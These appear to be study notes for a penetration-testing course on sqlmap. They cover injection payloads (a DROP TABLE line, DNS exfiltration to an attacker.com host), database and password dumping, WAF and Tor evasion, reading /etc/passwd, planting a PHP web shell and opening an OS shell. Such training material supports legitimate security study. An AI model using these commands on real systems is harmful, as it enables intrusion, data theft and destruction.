# SQLMAP

## SQLMAP OVERVIEW

Free, open-source, Python — automates SQLi detection and exploitation end to end. Been actively maintained since 2006, still the industry-standard tool for this.

```bash
sudo apt install sqlmap
```

or straight from source:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap.py
```

Already sitting on Pwnbox by default.

Broadest DBMS coverage of any SQLi tool out there — MySQL, PostgreSQL, Oracle, MSSQL, SQLite, MariaDB, DB2, and dozens more niche ones. Full current list lives in `sqlmap -hh` or the wiki, not worth memorizing.

## SQL INJECTION TYPES (BEUSTQ)

`--technique` covers every known SQLi type, default is all of them at once:

```
B - Boolean-based blind
E - Error-based
U - UNION query-based
S - Stacked queries
T - Time-based blind
Q - Inline queries
```

**Boolean-based blind** — TRUE vs FALSE gets read off response diffing (raw content, HTTP code, page title, filtered text). One bit per request, so figure ~7-8 requests to pull a single character. Most common SQLi type you'll actually run into.

```sql
AND 1=1
```

**Error-based** — DBMS error text comes back in the response, so a payload built to force a specific error smuggles data out through the error message itself. Fast — ~200-byte chunks per request, second only to UNION. Covers MySQL, PostgreSQL, Oracle, MSSQL, Sybase, Vertica, DB2, Firebird, MonetDB.

```sql
AND GTID_SUBSET(@@version,0)
```

**UNION query-based** — extend the original query, results ride back in the normal page response. Fastest type there is — best case, one request pulls an entire table.

```sql
UNION ALL SELECT 1,@@version,3
```

**Stacked queries** — piggyback extra statements after the vulnerable one with `;`. Only works if the backend actually supports it (MSSQL, PostgreSQL do by default) — needed for anything non-SELECT (INSERT/UPDATE/DELETE), and it's also sqlmap's route to OS command execution later on.

```sql
; DROP TABLE users
```

**Time-based blind** — same TRUE/FALSE logic as boolean-based, but read off response delay instead of content diff. Noticeably slower since every TRUE means sitting through the delay. This is the fallback when boolean-based can't apply — e.g. the vulnerable statement is a non-query action with zero effect on what gets rendered.

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

**Inline queries** — a query nested directly inside the original one. Rare, needs the app written in a very specific way to even be possible.

```sql
SELECT (SELECT @@version) from
```

**Out-of-band** — most advanced type, for when everything else is unsupported or too slow. sqlmap does this through DNS exfiltration: control the DNS for a domain, force the target to resolve subdomains that carry the actual data as labels, read the requests hitting your own DNS server.

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

## GETTING STARTED WITH SQLMAP

```bash
sqlmap -h     # essentials
sqlmap -hh    # everything
```

Wiki is the real manual, CLI help is just a quick reference.

Classic vulnerable target — no sanitization on a GET param going straight into a query, errors turned on so any SQL hiccup gets reflected back:

```php
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result) die("SQL error: ". mysqli_error($link));
```

Point sqlmap at it:

```bash
sqlmap -u "<TARGET_URL>?id=1" --batch
```

`--batch` auto-picks the default answer for every prompt — the one you'll want for anything non-interactive.

A normal run: confirm the param's dynamic → heuristic guess at the DBMS → offer to skip other DBMS-specific payloads → run through each technique → report exact payload + type per finding → fingerprint the backend DBMS and web stack. Everything gets cached under `~/.sqlmap/output/<target>/` — rerun against the same target later and it skips straight past re-detection using that session data.

## SQLMAP OUTPUT DESCRIPTION

Actually worth reading these instead of scrolling past — they tell you exactly what got found and how, which is most of your report write-up done for you.

```
target URL content is stable        no noise between identical requests — good, means diffing will actually work
parameter appears to be dynamic     param really changes the response; "static" = probably the wrong one to target
might be injectable (DBMS: X)       heuristic hit from an intentionally garbled value (e.g. ?id=1",)..).))') triggering a DBMS-specific error — not proof yet, gets confirmed properly next
might be vulnerable to XSS          free side-check sqlmap runs regardless — handy signal on big multi-param sweeps
back-end DBMS is 'X'? skip others?  narrows all remaining tests to just that DBMS once there's a clear signal
extend level/risk for 'X'?          runs the full payload set for that specific DBMS instead of just the top picks
reflective value(s) found           payload junk showing up in the response itself — sqlmap filters this automatically, not a problem
appears to be 'X' injectable (--string="Y")   confirmed via a constant marker string — most reliable kind of hit, skips fuzzy comparison entirely
time-based comparison requires larger statistical model   building a baseline of normal response times before it'll trust a delay as real
extending ranges for UNION query    UNION tests are expensive so they're capped by default — get the full budget once another technique already confirms the target's vulnerable
'ORDER BY' technique appears usable fast binary-search path to the right column count instead of brute-forcing 1 through 20
parameter is vulnerable             confirmed, not heuristic — decide here whether to keep hunting other params or call it
identified injection point(s) (N requests)   final proof-of-exploit: type, title, exact payload per technique that worked
fetched data logged to ...          local session cache path — every future run against this target reuses it
```

## RUNNING SQLMAP ON AN HTTP REQUEST

### CURL COMMANDS

Fastest clean setup: Copy as cURL from the browser's Network tab, paste, swap `curl` for `sqlmap`:

```bash
sqlmap '<TARGET_URL>?id=1' -H 'User-Agent: <UA_STRING>' --compressed -H 'Connection: keep-alive'
```

### GET/POST REQUESTS

GET param → `-u`. POST body → `--data`:

```bash
sqlmap '<TARGET_URL>' --data 'uid=1&name=test'
```

Every param in the body gets tested by default. Narrow to one with `-p uid`, or mark the exact spot yourself with `*`:

```bash
sqlmap '<TARGET_URL>' --data 'uid=1*&name=test'
```

### FULL HTTP REQUESTS

Complex request, lots of headers, long POST body — grab the raw request (Burp: right-click → Copy to file, or browser: Copy > Copy Request Headers), save it, run with `-r`:

```bash
sqlmap -r req.txt
```

Same `*` injection marker works inside the saved file too.

### CUSTOM SQLMAP REQUESTS

Manual header control without a full request file:

```bash
sqlmap ... --cookie='PHPSESSID=<VALUE>'
sqlmap ... -H='Cookie:PHPSESSID=<VALUE>'
```

Same pattern for `--host`, `--referer`, `-A`/`--user-agent`. Default `--random-agent` on principle — sqlmap's stock UA string (`sqlmap/x.x.x (http://sqlmap.org)`) is a known signature that a lot of protections drop on sight. `--mobile` fakes a phone UA instead.

Headers themselves are testable too, not just params — same `*` marker after the value:

```bash
--cookie="id=1*"
```

Non-GET/POST method:

```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

### CUSTOM HTTP REQUESTS

JSON and XML bodies both work — short ones fit fine in `--data`, longer or messier ones go through `-r` same as any complex request:

```bash
sqlmap -r req.txt
```

sqlmap auto-detects JSON in the body and asks whether to process it as structured data before testing.

## HANDLING SQLMAP ERRORS

`--parse-errors` surfaces the actual DBMS error text in the console — first thing to flip on when a run isn't behaving:

```bash
sqlmap -u "<TARGET_URL>" --parse-errors
```

`-t` dumps every request+response pair to a file for manual diffing:

```bash
sqlmap -u "<TARGET_URL>" --batch -t /tmp/traffic.txt
```

`-v 6` is the same idea live in the terminal instead:

```bash
sqlmap -u "<TARGET_URL>" -v 6 --batch
```

`--proxy` routes everything through Burp so you get repeat/intercept/manual tampering on top of the automation:

```bash
sqlmap -u "<TARGET_URL>" --proxy=http://127.0.0.1:8080
```

## ATTACK TUNING

Every payload = vector (the actual SQL doing the work) + boundary (prefix/suffix that fits it into the injection context). Default boundaries cover most cases, but sometimes you need to hand-build one:

```bash
sqlmap -u "<TARGET_URL>/?q=test" --prefix="%'))" --suffix="-- -"
```

matches a query shaped like `WHERE id LIKE (('<input>'))`.

`--level` (1-5, default 1) widens both vectors and boundaries tried — lower-probability ones get included as it climbs. `--risk` (1-3, default 1) widens vectors by how likely they are to actually damage something (data loss, DoS), not by detection odds — OR-based payloads sit in the higher risk tiers since they can misfire against DELETE/UPDATE. Payload count scales hard: 72 at defaults, ~7,865 at `--level=5 --risk=3`. Don't just max these out — only bump them when there's an actual reason, like a login form where OR-based logic is the only realistic shape the injection could take.

`-v 3`+ shows the literal `[PAYLOAD]` lines going out — the only real way to see what a level/risk change is actually doing differently.

Fine-tuning for tricky detection surfaces:

```
--code=200        pin TRUE detection to a specific HTTP status
--titles           compare based on <title> content only
--string=<VALUE>   pin TRUE detection to one known marker string
--text-only        strip HTML tags, compare visible text only
--technique=BEU    restrict to specific technique letters — useful for dropping ones causing trouble, e.g. time-based triggering timeouts
```

UNION-specific, when defaults don't line up with the real query:

```
--union-cols=17          exact column count, if you already worked it out manually
--union-char='a'         swap for sqlmap's default NULL/int filler values
--union-from=users       required FROM appendix some DBMS need (e.g. Oracle) — auto-detection needs the DBMS name first, which might not be known yet at this point
```

## DATABASE ENUMERATION

sqlmap has the actual query text for every enum action baked in per DBMS (`queries.xml`) — banner, current user, table listings, all of it. If detection already succeeded earlier, enumeration skips straight to querying using the cached session.

One-shot basic recon:

```bash
sqlmap -u "<TARGET_URL>?id=1" --banner --current-user --current-db --is-dba
```

gives version banner, active DB user, active database, and whether that user has DBA rights.

Table listing once you've got a DB name:

```bash
sqlmap -u "<TARGET_URL>" --tables -D testdb
```

Full table dump:

```bash
sqlmap -u "<TARGET_URL>" --dump -T users -D testdb
```

Lands as a local CSV by default — `--dump-format` for HTML or SQLite instead.

Narrow to specific columns:

```bash
sqlmap -u "<TARGET_URL>" --dump -T users -D testdb -C name,surname
```

Narrow to a row range:

```bash
sqlmap -u "<TARGET_URL>" --dump -T users -D testdb --start=2 --stop=3
```

Narrow by condition:

```bash
sqlmap -u "<TARGET_URL>" --dump -T users -D testdb --where="name LIKE 'f%'"
```

Drop `-T` to dump the whole database; `--dump-all` for every database on the server. Always pair `--dump-all` with `--exclude-sysdbs` — system DBs are just noise, never the target.

## ADVANCED DATABASE ENUMERATION

Full schema across every DB in one shot — good for getting your bearings fast on something unfamiliar:

```bash
sqlmap -u "<TARGET_URL>" --schema
```

Search by name instead of browsing blind — matches table names via `LIKE`:

```bash
sqlmap -u "<TARGET_URL>" --search -T user
```

Same for column names:

```bash
sqlmap -u "<TARGET_URL>" --search -C pass
```

Both offer to dump matches on the spot — fast way to triage where the actually-interesting data lives across a database with dozens of tables.

Password hashes get handled automatically — anything dumped that looks like a known hash format triggers an offer to dictionary-attack it right there (multi-process, ~1.4M-entry bundled wordlist, 31 supported hash types). Don't expect it to crack anything serious, but it's free and instant against weak or reused passwords.

DB-level credential dump — the DBMS's own internal accounts, not app table data:

```bash
sqlmap -u "<TARGET_URL>" --passwords --batch
```

`--all --batch` runs the entire sweep end to end, no stopping to ask anything. Can take a genuinely long time — plan to comb the output files afterward rather than watching it live.

## BYPASSING WEB APPLICATION PROTECTIONS

### ANTI-CSRF TOKEN BYPASS

`--csrf-token=<PARAM_NAME>` tells sqlmap which field holds the token so it can re-parse and refresh it out of each response before firing the next request. Even without specifying it, sqlmap prompts on its own if a param name looks token-shaped (`csrf`, `xsrf`, `token` substrings).

```bash
sqlmap -u "<TARGET_URL>" --data="id=1&csrf-token=<VALUE>" --csrf-token="csrf-token"
```

### UNIQUE VALUE BYPASS

No parsing needed here — just randomize a param's value on every request:

```bash
sqlmap -u "<TARGET_URL>/?id=1&rp=29125" --randomize=rp
```

### CALCULATED PARAMETER BYPASS

One param has to be a function of another — commonly an MD5 digest of it. `--eval` runs raw Python right before each request to compute it fresh:

```bash
sqlmap -u "<TARGET_URL>/?id=1&h=<HASH>" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

### IP ADDRESS CONCEALING

Single proxy, or a rotating list that auto-skips on failure/blacklist:

```bash
--proxy="socks4://<IP>:<PORT>"
--proxy-file=<LIST_FILE>
```

Tor instead — auto-detects the local SOCKS port (9050 or 9150):

```bash
--tor
--check-tor    # confirms via check.torproject.org
```

### WAF BYPASS

Every run fires a deliberately ugly-looking payload on a bogus param name early on, just to see how the target reacts — a big response delta (ModSecurity's classic 406, for instance) confirms something's sitting in front of it, and a bundled fingerprint library (identYwaf, ~80 signatures) tries to name what. `--skip-waf` skips this probe entirely if you want less noise on the wire.

### USER-AGENT BLACKLISTING BYPASS

sqlmap's default UA string is a known, easily-blocked signature. First thing to try on unexplained 5xx errors right from the start of a run:

```bash
--random-agent
```

### TAMPER SCRIPTS

Python scripts that rewrite the request right before it goes out — built specifically to slip past naive WAF/IPS pattern matching. Chain several with `--tamper=<a>,<b>`, they run in a fixed internal priority order so syntax-rewriting ones don't collide with pure content ones.

```
0eunion                     UNION → e0UNION
base64encode                base64-encodes the entire payload
between                     > → NOT BETWEEN 0 AND #, = → BETWEEN # AND #
commalesslimit               LIMIT M,N → LIMIT N OFFSET M (MySQL)
equaltolike                  = → LIKE
halfversionedmorekeywords    prepends a MySQL versioned comment to each keyword
modsecurityversioned         wraps the entire query in a MySQL versioned comment
modsecurityzeroversioned     same, zero-versioned
percentage                   %S%E%L%E%C%T-style char prefixing
plus2concat                  + → CONCAT() (MSSQL)
randomcase                   SEleCt-style random casing
space2comment                space → /**/-style comment
space2dash                   space → -- + random string + newline
space2hash                   space → # + random string + newline (MySQL)
space2mssqlblank             space → alternate MSSQL blank char
space2plus                   space → +
space2randomblank            space → random valid blank char
symboliclogical               AND/OR → && / ||
versionedkeywords            wraps each non-function keyword in a MySQL versioned comment
versionedmorekeywords        wraps every keyword in a MySQL versioned comment
```

Full current list: `--list-tampers`. Can write your own too — useful for oddball cases like second-order SQLi that the built-in ones don't cover.

### MISCELLANEOUS BYPASSES

`--chunked` splits the POST body into chunks so a blacklisted keyword never appears whole in any single piece. HTTP Parameter Pollution does the same splitting trick a different way — across repeated same-name params instead (`?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`), relying on the backend concatenating repeated params back together (ASP does this).

## OS EXPLOITATION

**File read** needs specific DB privileges, not just "being DBA" in the abstract — MySQL wants `LOAD DATA` + `INSERT`, since a read is really "load the file into a table, then read the table":

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

DBA rights make this a lot more likely but aren't the exact same permission. Check first:

```bash
sqlmap -u "<TARGET_URL>" --is-dba
```

Then just let sqlmap do it:

```bash
sqlmap -u "<TARGET_URL>" --file-read "/etc/passwd"
```

Saved locally under the same session cache directory as everything else.

**File write** is locked down harder than read, for the obvious reason — it's a straight line to a web shell. MySQL specifically needs `secure_file_priv` disabled DB-side, plus real OS write permission in the target directory.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "<TARGET_URL>" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

Confirmed write = confirmed RCE — just hit it:

```bash
curl "http://<TARGET_IP>/shell.php?cmd=id"
```

**OS shell** — sqlmap will get you here without writing anything by hand, using UDFs, output-capturing SQL functions, or a direct command-exec statement where one exists (`xp_cmdshell` on MSSQL):

```bash
sqlmap -u "<TARGET_URL>" --os-shell
```

The default technique choice can quietly fail — falls back to UNION and sometimes reports "No output" even when it actually worked internally. If that happens, force a technique more likely to surface real output, error-based being the good first retry:

```bash
sqlmap -u "<TARGET_URL>" --os-shell --technique=E
```

Prompts for the web language and a writable directory if it can't auto-detect either — both get answered automatically under `--batch` using sensible defaults (detected language, common webroot paths).